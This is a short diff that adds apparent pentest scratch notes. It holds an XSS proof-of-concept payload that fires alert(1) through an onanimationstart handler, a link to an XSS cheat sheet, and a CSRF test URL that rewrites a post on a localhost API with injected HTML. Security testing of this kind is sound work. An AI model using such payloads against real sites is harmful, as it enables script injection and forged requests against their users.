@@ -1,0 +1,10 @@
+//XSS
+<style>@keyframes x{}</style><p style=\\\"animation-name:x\\\" onanimationstart=\\\"alert(1)\\\"></p>
+
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+
+//CSRF
+
+http://localhost:3000/api/v1/posts/update/1?title=Hahahaha&content=<h2>Ovo</h2>
+
